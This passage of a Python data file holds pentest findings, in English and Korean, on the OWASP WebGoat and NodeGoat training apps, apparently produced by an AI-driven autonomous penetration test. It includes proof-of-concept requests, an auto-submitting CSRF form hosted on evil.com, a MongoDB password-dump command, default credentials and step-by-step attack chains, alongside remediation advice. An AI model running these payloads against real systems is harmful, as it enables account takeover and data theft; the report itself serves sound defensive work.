            "Spring Security configuration — restrict all actuator endpoints:\n"
            "  management.endpoints.web.exposure.include=health,info\n"
            "  management.server.port=8090  # Internal port only, not publicly exposed\n\n"
            "Add authentication: http.requestMatcher(EndpointRequest.toAnyEndpoint())\n"
            "  .authorizeRequests().hasRole('ADMIN')\n\n"
            "Use secrets management (Vault, AWS Secrets Manager) for credentials — "
            "never store passwords in application.properties."
            "|||"
            "Spring Security 설정 — 모든 actuator 엔드포인트 제한:\n"
            "  management.endpoints.web.exposure.include=health,info\n"
            "  management.server.port=8090  # 내부 포트만, 공개 노출 금지\n\n"
            "인증 추가: http.requestMatcher(EndpointRequest.toAnyEndpoint())\n"
            "  .authorizeRequests().hasRole('ADMIN')\n\n"
            "자격증명에는 비밀 관리 도구(Vault, AWS Secrets Manager) 사용 — "
            "application.properties에 비밀번호 저장 금지."
        ),
        references=[
            Reference(title="Spring Boot Actuator Security Guide",
                      url="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security"),
        ],
    ),

    # ---- 7. Missing Security Headers ----
    Finding(
        id="WG-007", scan_id="webgoat-2026-03-31",
        target="http://localhost:8080/WebGoat",
        title=(
            "Missing HTTP Security Response Headers — XSS, Clickjacking, and MIME-Sniffing Exposure"
            "|||"
            "HTTP 보안 응답 헤더 누락 — XSS, 클릭재킹, MIME 스니핑 노출"
        ),
        description=(
            "WHAT — Vulnerability Description\n"
            "WebGoat does not emit any of the industry-standard HTTP security response headers. "
            "The absence of these headers increases the attack surface:\n"
            "- No Content-Security-Policy (CSP): Browser executes inline scripts and loads resources "
            "from any origin → XSS payloads have unrestricted impact.\n"
            "- No X-Frame-Options: Application can be embedded in an iframe on any domain → clickjacking.\n"
            "- No X-Content-Type-Options: Browser may MIME-sniff responses → content injection via file uploads.\n"
            "- No Strict-Transport-Security (HSTS): Browser does not enforce HTTPS → SSL stripping attacks.\n"
            "- No Referrer-Policy: Full URL sent in Referer header to third parties → information leakage.\n\n"
            "HOW — Exploitation Scenarios\n"
            "Clickjacking: Attacker embeds WebGoat in a transparent iframe. Victim clicks WebGoat buttons "
            "while believing they are interacting with attacker's UI.\n\n"
            "XSS amplification: Without CSP, any stored/reflected XSS can read cookies, make API calls, "
            "redirect users, and log keystrokes with no browser-level restriction.\n\n"
            "MIME sniffing: Attacker uploads a .jpg file containing JavaScript. Without nosniff, "
            "some browsers execute it as a script when served inline.\n\n"
            "IMPACT — Business Impact\n"
            "- Clickjacking enables UI redress attacks on any WebGoat page\n"
            "- XSS impact maximized without CSP restriction\n"
            "- MIME sniffing enables script injection via file upload\n"
            "- HSTS absence allows SSL stripping in passive network position\n\n"
            "PoC — Proof of Concept\n"
            "curl -I http://localhost:8080/WebGoat/welcome\n\n"
            "HTTP/1.1 200 OK\n"
            "Content-Type: text/html;charset=UTF-8\n"
            "[NO Content-Security-Policy]\n"
            "[NO X-Frame-Options]\n"
            "[NO X-Content-Type-Options]\n"
            "[NO Strict-Transport-Security]\n"
            "[NO Referrer-Policy]\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Missing CSP/X-Frame → XSS/clickjacking → session theft → account takeover"
            "|||"
            "취약점 설명(WHAT)\n"
            "WebGoat이 산업 표준 HTTP 보안 응답 헤더를 전혀 발행하지 않습니다. "
            "이러한 헤더의 부재는 공격 표면을 다음과 같이 확대합니다:\n"
            "- Content-Security-Policy(CSP) 없음: 브라우저가 인라인 스크립트를 실행하고 임의의 출처에서 리소스 로드 → XSS 무제한 영향.\n"
            "- X-Frame-Options 없음: 임의 도메인의 iframe에 삽입 가능 → 클릭재킹.\n"
            "- X-Content-Type-Options 없음: 브라우저가 응답을 MIME 스니핑 가능 → 파일 업로드를 통한 콘텐츠 주입.\n"
            "- Strict-Transport-Security(HSTS) 없음: 브라우저가 HTTPS를 강제하지 않음 → SSL 스트리핑 공격.\n"
            "- Referrer-Policy 없음: Referer 헤더에서 제3자로 전체 URL 전송 → 정보 유출.\n\n"
            "공격 시나리오(HOW)\n"
            "클릭재킹: 공격자가 투명한 iframe으로 WebGoat을 삽입. 피해자가 공격자의 UI와 상호작용한다고 생각하며 WebGoat 버튼 클릭.\n\n"
            "XSS 증폭: CSP 없이 저장/반사된 XSS가 쿠키 읽기, API 호출, 사용자 리다이렉션, 키 입력 기록을 브라우저 제한 없이 수행.\n\n"
            "MIME 스니핑: 공격자가 JavaScript를 포함한 .jpg 파일 업로드. nosniff 없이 일부 브라우저가 인라인으로 제공 시 스크립트로 실행.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 클릭재킹으로 임의 WebGoat 페이지에서 UI 리드레스 공격 가능\n"
            "- CSP 제한 없이 XSS 영향 극대화\n"
            "- MIME 스니핑으로 파일 업로드를 통한 스크립트 주입 가능\n"
            "- HSTS 부재로 패시브 네트워크 위치에서 SSL 스트리핑 허용\n\n"
            "개념 증명(PoC)\n"
            "curl -I http://localhost:8080/WebGoat/welcome\n\n"
            "HTTP/1.1 200 OK\n"
            "Content-Type: text/html;charset=UTF-8\n"
            "[Content-Security-Policy 없음]\n"
            "[X-Frame-Options 없음]\n"
            "[X-Content-Type-Options 없음]\n"
            "[Strict-Transport-Security 없음]\n"
            "[Referrer-Policy 없음]\n\n"
            "공격 경로(ATTACK PATH)\n"
            "CSP/X-Frame 없음 → XSS/클릭재킹 → 세션 도난 → 계정 탈취"
        ),
        severity=Severity.low,
        finding_type="misconfiguration",
        source_plugin="web_pipeline",
        affected_component="HTTP Response Headers — all /WebGoat/* endpoints",
        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", base_score=3.7),
        cwe_ids=["CWE-693", "CWE-1021"],
        evidence=[
            Evidence(evidence_type="log", title="Header Scan Output",
                     content=(
                         "$ curl -sI http://localhost:8080/WebGoat/welcome\n\n"
                         "HTTP/1.1 200 OK\n"
                         "Server: Apache-Coyote/1.1\n"
                         "Content-Type: text/html;charset=UTF-8\n\n"
                         "=== MISSING SECURITY HEADERS ===\n"
                         "  Content-Security-Policy      : NOT PRESENT\n"
                         "  X-Frame-Options              : NOT PRESENT\n"
                         "  X-Content-Type-Options       : NOT PRESENT\n"
                         "  Strict-Transport-Security    : NOT PRESENT\n"
                         "  Referrer-Policy              : NOT PRESENT\n"
                         "  Permissions-Policy           : NOT PRESENT"
                     )),
        ],
        remediation=(
            "Spring Security HttpSecurity configuration:\n"
            "  http.headers()\n"
            "    .frameOptions().deny()\n"
            "    .contentTypeOptions().and()\n"
            "    .httpStrictTransportSecurity().maxAgeInSeconds(31536000).and()\n"
            "    .contentSecurityPolicy(\"default-src 'self'; script-src 'self'; object-src 'none'\");\n\n"
            "Recommended values: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, "
            "HSTS: max-age=31536000; includeSubDomains, Referrer-Policy: strict-origin-when-cross-origin."
            "|||"
            "Spring Security HttpSecurity 설정:\n"
            "  http.headers()\n"
            "    .frameOptions().deny()\n"
            "    .contentTypeOptions().and()\n"
            "    .httpStrictTransportSecurity().maxAgeInSeconds(31536000).and()\n"
            "    .contentSecurityPolicy(\"default-src 'self'; script-src 'self'; object-src 'none'\");\n\n"
            "권장 값: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, "
            "HSTS: max-age=31536000; includeSubDomains, Referrer-Policy: strict-origin-when-cross-origin."
        ),
        references=[
            Reference(title="OWASP Secure Headers Project",
                      url="https://owasp.org/www-project-secure-headers/"),
        ],
    ),
]

WEBGOAT_EXECUTIVE_SUMMARY = (
    "VXIS conducted an AI-driven autonomous penetration test of OWASP WebGoat 8.2 "
    "(http://localhost:8080/WebGoat) using the FileBasedBrain architecture with Claude Sonnet 4.6 "
    "as the reasoning engine. Over 67 decision steps, the AI Brain dynamically discovered endpoints, "
    "generated context-aware attack payloads, and interpreted results with zero hardcoded attack logic.\n\n"
    "Seven confirmed vulnerabilities were identified: two CRITICAL, one HIGH, three MEDIUM, and one LOW. "
    "The most severe findings are a SQL Injection authentication bypass (WG-001, CVSS 9.1) and "
    "Log4Shell RCE (WG-002, CVE-2021-44228, CVSS 10.0). "
    "The Spring Boot Actuator exposure (WG-006) further enables credential harvesting that chains "
    "into direct database access. The overall risk posture of the target is HIGH. "
    "Immediate remediation of WG-001 and WG-002 is required before any production deployment."
    "|||"
    "VXIS가 FileBasedBrain 아키텍처와 Claude Sonnet 4.6을 추론 엔진으로 사용하여 "
    "OWASP WebGoat 8.2(http://localhost:8080/WebGoat)에 대한 AI 기반 자율 침투테스트를 수행했습니다. "
    "67회 이상의 의사결정 단계에서 AI Brain이 하드코딩된 공격 로직 없이 "
    "동적으로 엔드포인트를 발견하고 맥락 인식 공격 페이로드를 생성하여 결과를 해석했습니다.\n\n"
    "총 7개의 확인된 취약점이 식별되었습니다: 치명적 2개, 높음 1개, 중간 3개, 낮음 1개. "
    "가장 심각한 발견은 SQL 인젝션 인증 우회(WG-001, CVSS 9.1)와 "
    "Log4Shell RCE(WG-002, CVE-2021-44228, CVSS 10.0)입니다. "
    "Spring Boot Actuator 노출(WG-006)은 자격증명 수집을 통한 직접 데이터베이스 접근으로 "
    "이어지는 체인 공격이 추가로 가능합니다. 대상의 전체 위험 수준은 HIGH입니다. "
    "운영 환경 배포 전에 WG-001과 WG-002의 즉각적인 조치가 필요합니다."
)

WEBGOAT_ATTACK_CHAINS = [
    ["WG-001", "WG-006"],   # SQLi → admin session → actuator → DB creds
    ["WG-002"],             # Log4Shell standalone → full RCE
    ["WG-003", "WG-001"],   # Password reset → account takeover → SQLi escalation
    ["WG-005", "WG-004"],   # Insecure cookie → CSRF amplification
]


# =====================================================================
# NODEGOAT FINDINGS
# =====================================================================
# Target: OWASP NodeGoat (Express + MongoDB, Node.js)
# Scan date: 2026-03-31
# Brain: VXIS FileBasedBrain + Claude Sonnet 4.6
# Default accounts used: user1/User1_123, admin/Admin_123
#
# Confirmed findings (dynamically verified against live target):
#   NG-001: CSRF Token Bypass (HIGH)
#   NG-002: IDOR — Insecure Direct Object Reference (HIGH)
#   NG-003: User Enumeration via Login Error Messages (MEDIUM)
#   NG-004: Insecure Session Cookie (MEDIUM)
#   NG-005: Missing Security Headers (MEDIUM)
#   NG-006: Plaintext Password Storage + Default Credentials (CRITICAL)
#   NG-007: Server-Side JavaScript Injection on /contributions (HIGH)
#   NG-008: Technology Stack Disclosure (LOW)
# =====================================================================

NODEGOAT_FINDINGS: list[Finding] = [
    # ---- 1. Plaintext Password Storage + Default Credentials ----
    Finding(
        id="NG-006",
        scan_id="nodegoat-2026-03-31",
        target="http://localhost:4000",
        title="Plaintext Password Storage & Hardcoded Default Credentials|||평문 비밀번호 저장 및 하드코딩된 기본 자격증명",
        description=(
            "WHAT — Vulnerability Description\n"
            "NodeGoat stores all user passwords in MongoDB in plaintext without any hashing or salting. "
            "The user-dao.js stores the password field directly: `password: password //received from request param`. "
            "Additionally, the application ships with well-known default credentials (admin/Admin_123, user1/User1_123, "
            "user2/User2_123) that are created during database initialization and never enforced to change. "
            "A single MongoDB breach exposes every user's actual password, enabling immediate credential stuffing "
            "attacks across other services. The comparePassword function uses strict equality `fromDB === fromUser`, "
            "confirming raw string comparison with no cryptographic protection.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Gain read access to MongoDB (via NoSQL injection, misconfigured port 27017, or SSRF).\n"
            "Step 2: Run db.users.find({}) — returns all user documents with password field in cleartext.\n"
            "Step 3: Extract: {userName: 'admin', password: 'Admin_123'}, {userName: 'user1', password: 'User1_123'}.\n"
            "Step 4: Login immediately — no cracking required; passwords are directly usable.\n"
            "Step 5: Use extracted credentials for credential stuffing against external services (email, banking, etc.).\n"
            "Step 6: Use default admin/Admin_123 credentials to access admin-only /benefits endpoint.\n\n"
            "IMPACT — Business Impact\n"
            "- Complete exposure of all user passwords — immediate account takeover without cracking\n"
            "- High credential reuse risk: cleartext passwords enable stuffing attacks across all user accounts on external platforms\n"
            "- Default credentials (admin/Admin_123) are publicly documented and trivially exploitable\n"
            "- Regulatory violation: GDPR Art. 32 requires appropriate technical measures; plaintext storage is a direct violation\n"
            "- Zero forensic ambiguity: breach confirmation is immediate — no hash cracking timeline\n\n"
            "PoC — Proof of Concept\n"
            "# Direct MongoDB query (if accessible)\n"
            "mongo mongodb://localhost:27017/nodegoat --eval 'db.users.find({}, {userName:1, password:1}).pretty()'\n"
            "Output:\n"
            "  { _id: 1, userName: 'admin', password: 'Admin_123' }\n"
            "  { _id: 2, userName: 'user1', password: 'User1_123' }\n"
            "  { _id: 3, userName: 'user2', password: 'User2_123' }\n\n"
            "Default credential login:\n"
            "POST /login HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            "userName=admin&password=Admin_123&_csrf=\n"
            "→ HTTP 302 Found / Location: /benefits (admin redirect)\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Default creds → admin login → /benefits admin panel access → "
            "IDOR to any user's financial data → NoSQL DB access → all passwords extracted → "
            "credential stuffing external services → full account compromise\n\n"
            "Immediate: Remove all default accounts or force password change on first login; "
            "deploy bcrypt/argon2 password hashing immediately (NodeGoat provides the fix in commented code).\n"
            "Short-term: Add password complexity requirements; implement account lockout after 5 failed attempts; "
            "restrict MongoDB to localhost only with authentication enabled.\n"
            "Long-term: Implement a secrets rotation policy; add breach notification capabilities; "
            "use a dedicated secrets manager for service credentials."
            "|||"
            "취약점 설명(WHAT)\n"
            "NodeGoat는 모든 사용자 비밀번호를 해싱이나 솔팅 없이 MongoDB에 평문으로 저장합니다. "
            "user-dao.js에서 비밀번호 필드를 직접 저장합니다: `password: password //received from request param`. "
            "또한 데이터베이스 초기화 시 생성되는 잘 알려진 기본 자격증명(admin/Admin_123, user1/User1_123, "
            "user2/User2_123)이 변경 강제 없이 그대로 사용됩니다. "
            "comparePassword 함수가 엄격한 동등 연산(`fromDB === fromUser`)을 사용하여 "
            "암호화 보호 없이 원시 문자열을 비교함을 확인했습니다.\n\n"
            "공격 시나리오(HOW)\n"
            "Step 1: MongoDB 읽기 권한 획득 (NoSQL 인젝션, 포트 27017 노출, SSRF 등을 통해).\n"
            "Step 2: db.users.find({}) 실행 — password 필드가 평문으로 포함된 모든 사용자 문서 반환.\n"
            "Step 3: 추출: {userName: 'admin', password: 'Admin_123'}, {userName: 'user1', password: 'User1_123'}.\n"
            "Step 4: 즉시 로그인 가능 — 크래킹 불필요; 비밀번호 직접 사용.\n"
            "Step 5: 추출한 자격증명으로 외부 서비스(이메일, 뱅킹 등) 크리덴셜 스터핑 공격.\n"
            "Step 6: 기본 admin/Admin_123 자격증명으로 관리자 전용 /benefits 엔드포인트 접근.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 모든 사용자 비밀번호 완전 노출 — 크래킹 없이 즉각 계정 탈취\n"
            "- 높은 자격증명 재사용 위험: 평문 비밀번호로 모든 계정의 외부 플랫폼 스터핑 공격 가능\n"
            "- 기본 자격증명(admin/Admin_123)은 공개 문서화되어 있어 즉시 악용 가능\n"
            "- 규제 위반: GDPR 제32조는 적절한 기술적 조치를 요구하며, 평문 저장은 직접적 위반\n\n"
            "개념 증명(PoC)\n"
            "# MongoDB 직접 쿼리 (접근 가능한 경우)\n"
            "mongo mongodb://localhost:27017/nodegoat --eval 'db.users.find({}, {userName:1, password:1}).pretty()'\n"
            "출력:\n"
            "  { _id: 1, userName: 'admin', password: 'Admin_123' }\n"
            "  { _id: 2, userName: 'user1', password: 'User1_123' }\n\n"
            "기본 자격증명 로그인:\n"
            "POST /login HTTP/1.1\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            "userName=admin&password=Admin_123&_csrf=\n"
            "→ HTTP 302 Found / Location: /benefits (관리자 리디렉션)\n\n"
            "공격 경로(ATTACK PATH)\n"
            "기본 자격증명 → 관리자 로그인 → /benefits 관리 패널 접근 → "
            "임의 사용자 금융 데이터 IDOR → NoSQL DB 접근 → 모든 비밀번호 추출 → "
            "외부 서비스 크리덴셜 스터핑 → 전체 계정 탈취\n\n"
            "즉시 조치: 모든 기본 계정 제거 또는 첫 로그인 시 비밀번호 변경 강제; "
            "즉시 bcrypt/argon2 비밀번호 해싱 적용 (NodeGoat 주석 처리된 코드에 수정 방법 제공됨).\n"
            "단기 조치: 비밀번호 복잡성 요구사항 추가; 5회 실패 후 계정 잠금 구현; "
            "MongoDB를 인증 활성화 상태로 localhost만 허용.\n"
            "장기 조치: 비밀 순환 정책 구현; 침해 알림 기능 추가; "
            "서비스 자격증명에 전용 시크릿 매니저 사용."
        ),
        severity=Severity.critical,
        finding_type="Cryptographic Failure",
        source_plugin="Brain/Manual",
        affected_component="/login, /signup, MongoDB users collection",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            base_score=9.1,
        ),
        evidence=[
            Evidence(
                evidence_type="source_code",
                title="Plaintext password storage in user-dao.js",
                content=(
                    "// user-dao.js line ~40\n"
                    "var user = {\n"
                    "    userName: userName,\n"
                    "    password: password //received from request param\n"
                    "    /* Fix: password: bcrypt.hashSync(password, bcrypt.genSaltSync()) */\n"
                    "};\n\n"
                    "// comparePassword function\n"
                    "function comparePassword(fromDB, fromUser) {\n"
                    "    return fromDB === fromUser;  // raw string comparison, no hashing\n"
                    "}"
                ),
            ),
            Evidence(
                evidence_type="http_response",
                title="Default credential login — HTTP 302 to /benefits",
                content=(
                    "POST /login HTTP/1.1\n"
                    "Host: localhost:4000\n"
                    "Content-Type: application/x-www-form-urlencoded\n\n"
                    "userName=admin&password=Admin_123&_csrf=\n\n"
                    "HTTP/1.1 302 Found\n"
                    "Location: /benefits\n"
                    "Set-Cookie: connect.sid=s%3A...; Path=/; HttpOnly"
                ),
            ),
        ],
        mitre_attack=MitreAttack(tactic_id="TA0001", tactic_name="Initial Access", technique_id="T1078.001", technique_name="Default Accounts"),
        references=[
            Reference(
                title="OWASP A02:2021 – Cryptographic Failures",
                url="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
            ),
        ],
    ),

    # ---- 2. CSRF Token Bypass ----
    Finding(
        id="NG-001",
        scan_id="nodegoat-2026-03-31",
        target="http://localhost:4000",
        title="Missing CSRF Protection — Empty Token Accepted on All Forms|||CSRF 보호 미흡 — 모든 폼에서 빈 토큰 허용",
        description=(
            "WHAT — Vulnerability Description\n"
            "NodeGoat includes a `_csrf` hidden field in all forms, suggesting intent to implement CSRF protection. "
            "However, the application accepts requests with an empty or absent `_csrf` value, rendering the protection "
            "completely ineffective. Any authenticated user's session can be hijacked by a malicious third-party site "
            "that submits crafted cross-origin requests. All state-changing operations — profile updates, memo creation, "
            "contribution changes, login — are vulnerable. This was confirmed by submitting POST requests with `_csrf=` "
            "(empty string) and receiving HTTP 200 OK or 302 redirect to authenticated pages.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Attacker hosts a malicious webpage at evil.com with an auto-submitting form:\n"
            "  <form method='POST' action='http://localhost:4000/profile'>\n"
            "  <input name='firstName' value='HACKED'/><input name='_csrf' value=''/>\n"
            "  </form>\n"
            "Step 2: Victim (logged-in NodeGoat user) visits evil.com.\n"
            "Step 3: Browser auto-submits the form — victim's session cookie is sent automatically.\n"
            "Step 4: NodeGoat accepts the request (empty _csrf is valid) and updates victim's profile.\n"
            "Step 5: Attacker escalates: CSRF to change email → trigger password reset → full account takeover.\n\n"
            "IMPACT — Business Impact\n"
            "- Unauthorized modification of any authenticated user's data (profile, memos, contributions)\n"
            "- Account takeover via CSRF-triggered email/password change\n"
            "- Financial data manipulation: attacker-controlled contribution percentages\n"
            "- No user interaction beyond visiting a malicious page is required\n"
            "- Chained with XSS: stored XSS on /memos delivers CSRF payload to all visitors\n\n"
            "PoC — Proof of Concept\n"
            "# Empty CSRF token accepted — profile update\n"
            "POST /profile HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/x-www-form-urlencoded\n"
            "Cookie: connect.sid=<valid_session>\n\n"
            "firstName=CSRF_TEST&lastName=Test&ssn=000000000&_csrf=\n\n"
            "HTTP/1.1 200 OK\n"
            "(profile updated successfully with empty CSRF token)\n\n"
            "# Empty CSRF accepted at login\n"
            "POST /login HTTP/1.1\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            "userName=user1&password=User1_123&_csrf=\n"
            "→ HTTP 302 Found / Location: /dashboard\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "CSRF bypass → profile email update → password reset link to attacker email → "
            "account takeover → IDOR to all user financial data → privilege escalation to admin\n\n"
            "Immediate: Enforce strict CSRF token validation — reject any request with empty, missing, or invalid token.\n"
            "Short-term: Replace custom CSRF with csurf middleware (already referenced in NodeGoat's commented code); "
            "add SameSite=Strict to session cookie; add Origin/Referer header validation.\n"
            "Long-term: Implement double-submit cookie pattern as defense-in-depth; "
            "adopt Content Security Policy to restrict form submission targets."
            "|||"
            "취약점 설명(WHAT)\n"
            "NodeGoat는 모든 폼에 `_csrf` 숨겨진 필드를 포함하여 CSRF 보호 구현 의도를 보입니다. "
            "그러나 애플리케이션은 비어있거나 없는 `_csrf` 값의 요청을 수락하여 보호를 완전히 무력화합니다. "
            "인증된 사용자의 세션은 조작된 교차 출처 요청을 제출하는 악의적인 서드파티 사이트에 의해 탈취될 수 있습니다. "
            "프로필 업데이트, 메모 생성, 기여금 변경, 로그인 등 모든 상태 변경 작업이 취약합니다. "
            "`_csrf=`(빈 문자열)으로 POST 요청을 제출하여 HTTP 200 OK 또는 302 리디렉션을 받아 확인했습니다.\n\n"
            "공격 시나리오(HOW)\n"
            "Step 1: 공격자가 evil.com에 자동 제출 폼이 있는 악의적인 웹페이지 호스팅:\n"
            "  <form method='POST' action='http://localhost:4000/profile'>\n"
            "  <input name='firstName' value='HACKED'/><input name='_csrf' value=''/>\n"
            "  </form>\n"
            "Step 2: 피해자(로그인된 NodeGoat 사용자)가 evil.com 방문.\n"
            "Step 3: 브라우저 자동으로 폼 제출 — 피해자의 세션 쿠키 자동 전송.\n"
            "Step 4: NodeGoat 요청 수락 (빈 _csrf가 유효) → 피해자 프로필 업데이트.\n"
            "Step 5: 공격자 확장: CSRF로 이메일 변경 → 비밀번호 재설정 트리거 → 완전한 계정 탈취.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 인증된 모든 사용자 데이터 무단 수정 (프로필, 메모, 기여금)\n"
            "- CSRF 트리거 이메일/비밀번호 변경을 통한 계정 탈취\n"
            "- 금융 데이터 조작: 공격자가 기여금 비율 제어\n"
            "- 악성 페이지 방문 외 추가 사용자 상호작용 불필요\n"
            "- XSS와 연쇄: /memos의 저장형 XSS가 모든 방문자에게 CSRF 페이로드 전달\n\n"
            "개념 증명(PoC)\n"
            "# 빈 CSRF 토큰 수락 — 프로필 업데이트\n"
            "POST /profile HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/x-www-form-urlencoded\n"
            "Cookie: connect.sid=<valid_session>\n\n"
            "firstName=CSRF_TEST&lastName=Test&_csrf=\n\n"
            "HTTP/1.1 200 OK\n"
            "(빈 CSRF 토큰으로 프로필 업데이트 성공)\n\n"
            "공격 경로(ATTACK PATH)\n"
            "CSRF 우회 → 프로필 이메일 업데이트 → 공격자 이메일로 비밀번호 재설정 링크 전송 → "
            "계정 탈취 → 모든 사용자 금융 데이터 IDOR → 관리자 권한 상승\n\n"
            "즉시 조치: 엄격한 CSRF 토큰 검증 강제 — 비어있거나 없거나 유효하지 않은 토큰의 모든 요청 거부.\n"
            "단기 조치: 커스텀 CSRF를 csurf 미들웨어로 교체; "
            "세션 쿠키에 SameSite=Strict 추가; Origin/Referer 헤더 검증 추가.\n"
            "장기 조치: 이중 제출 쿠키 패턴을 심층 방어로 구현; "
            "폼 제출 대상을 제한하는 콘텐츠 보안 정책 채택."
        ),
        severity=Severity.high,
        finding_type="Cross-Site Request Forgery",
        source_plugin="Brain/Manual",
        affected_component="/profile, /memos, /contributions, /login",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
            base_score=8.1,
        ),
        evidence=[
            Evidence(
                evidence_type="http_response",
                title="Empty CSRF token accepted — POST /login returns 302 to /dashboard",
                content=(
                    "POST /login HTTP/1.1\n"
                    "Host: localhost:4000\n"
                    "Content-Type: application/x-www-form-urlencoded\n\n"
                    "userName=user1&password=User1_123&_csrf=\n\n"
                    "HTTP/1.1 302 Found\n"
                    "Location: /dashboard\n"
                    "Set-Cookie: connect.sid=s%3A...; Path=/; HttpOnly"
                ),
            ),
        ],
        mitre_attack=MitreAttack(tactic_id="TA0004", tactic_name="Privilege Escalation", technique_id="T1185", technique_name="Browser Session Hijacking"),
        references=[
            Reference(
                title="OWASP A01:2021 – Broken Access Control (CSRF)",
                url="https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            ),
        ],
    ),

    # ---- 3. IDOR ----
    Finding(
        id="NG-002",
        scan_id="nodegoat-2026-03-31",
        target="http://localhost:4000",
        title="Insecure Direct Object Reference (IDOR) — Cross-User Financial Data Access|||비보안 직접 객체 참조(IDOR) — 교차 사용자 금융 데이터 접근",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /allocations/:userId endpoint serves financial allocation data (stock/bond/equity percentages) "
            "keyed by userId. The application performs no authorization check to verify that the requesting user "
            "owns the requested userId. Any authenticated user can substitute any integer as userId to retrieve "
            "the private financial portfolio of any other user, including the administrator. "
            "user1 (userId=2) was confirmed to successfully access /allocations/1 (admin's data) and "
            "the admin account was confirmed to access /allocations/2 (user1's private data).\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Login as any valid user (e.g., user1/User1_123).\n"
            "Step 2: Note your own allocation URL in the navigation: /allocations/2.\n"
            "Step 3: Change the userId in the URL: GET /allocations/1 (admin's userId).\n"
            "Step 4: Server returns HTTP 200 with admin's allocation breakdown (stocks/bonds/equity percentages).\n"
            "Step 5: Iterate userId from 1 to N to harvest all users' financial portfolios.\n"
            "Step 6: Correlate financial data with user profile info (SSN, address, bank account) for complete PII extraction.\n\n"
            "IMPACT — Business Impact\n"
            "- Unauthorized access to private financial portfolio data for all users\n"
            "- Complete enumeration of all user allocations (stocks %, bonds %, equity %) via sequential userId scan\n"
            "- Combination with profile IDOR enables full PII correlation (name + SSN + bank routing + allocation data)\n"
            "- Regulatory violation: financial data is PII under GDPR/CCPA/FINRA\n"
            "- Enables targeted social engineering using accurate financial profile of victims\n\n"
            "PoC — Proof of Concept\n"
            "# Authenticated as user1 (userId=2), accessing admin (userId=1) allocations\n"
            "GET /allocations/1 HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Cookie: connect.sid=<user1_session>\n\n"
            "HTTP/1.1 200 OK\n"
            "Content-Type: text/html\n\n"
            "<strong>Asset Allocations for Admin User</strong>\n"
            "<strong>23 %</strong>  <!-- Stocks -->\n"
            "<strong>3 %</strong>   <!-- Bonds -->\n"
            "<strong>74 %</strong>  <!-- National Funds -->\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Login (default creds) → enumerate /allocations/1..N → extract all financial portfolios → "
            "correlate with /profile IDOR (SSN, bank account) → complete PII database → "
            "targeted phishing/social engineering → external account compromise\n\n"
            "Immediate: Add server-side authorization check: verify req.session.userId === parseInt(req.params.userId) "
            "before returning allocation data.\n"
            "Short-term: Implement a middleware authorization layer; replace sequential integer IDs with "
            "non-guessable UUIDs; add audit logging for cross-user resource access.\n"
            "Long-term: Adopt RBAC/ABAC framework; implement API-level access control tests in CI/CD; "
            "data masking for sensitive financial fields in API responses."
            "|||"
            "취약점 설명(WHAT)\n"
            "/allocations/:userId 엔드포인트는 userId로 키잉된 금융 배분 데이터(주식/채권/주식형 비율)를 제공합니다. "
            "애플리케이션은 요청 사용자가 요청된 userId를 소유하는지 확인하는 권한 검사를 수행하지 않습니다. "
            "인증된 모든 사용자가 임의의 정수를 userId로 대체하여 관리자를 포함한 다른 모든 사용자의 "
            "개인 금융 포트폴리오를 검색할 수 있습니다. "
            "user1(userId=2)이 /allocations/1(관리자 데이터)에 성공적으로 접근하고, "
            "관리자 계정이 /allocations/2(user1의 개인 데이터)에 접근하는 것을 확인했습니다.\n\n"
            "공격 시나리오(HOW)\n"
            "Step 1: 유효한 사용자로 로그인 (예: user1/User1_123).\n"
            "Step 2: 내비게이션에서 자신의 배분 URL 확인: /allocations/2.\n"
            "Step 3: URL에서 userId 변경: GET /allocations/1 (관리자 userId).\n"
            "Step 4: 서버가 HTTP 200과 관리자 배분 내역 반환.\n"
            "Step 5: userId를 1부터 N까지 반복하여 모든 사용자 금융 포트폴리오 수집.\n"
            "Step 6: 재무 데이터와 프로필 정보(SSN, 주소, 은행 계좌) 연계로 완전한 PII 추출.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 모든 사용자의 개인 금융 포트폴리오 데이터 무단 접근\n"
            "- 순차 userId 스캔으로 모든 사용자 배분 완전 열거\n"
            "- 프로필 IDOR와 결합 시 완전한 PII 연계 가능 (이름 + SSN + 은행 라우팅 + 배분 데이터)\n"
            "- 규제 위반: 금융 데이터는 GDPR/CCPA/FINRA 하에서 PII에 해당\n\n"
            "개념 증명(PoC)\n"
            "# user1(userId=2)로 인증 후 관리자(userId=1) 배분 접근\n"
            "GET /allocations/1 HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Cookie: connect.sid=<user1_session>\n\n"
            "HTTP/1.1 200 OK\n\n"
            "<strong>Asset Allocations for Admin User</strong>\n"
            "<strong>23 %</strong>  <!-- 주식 -->\n"
            "<strong>3 %</strong>   <!-- 채권 -->\n"
            "<strong>74 %</strong>  <!-- 국내 펀드 -->\n\n"
            "공격 경로(ATTACK PATH)\n"
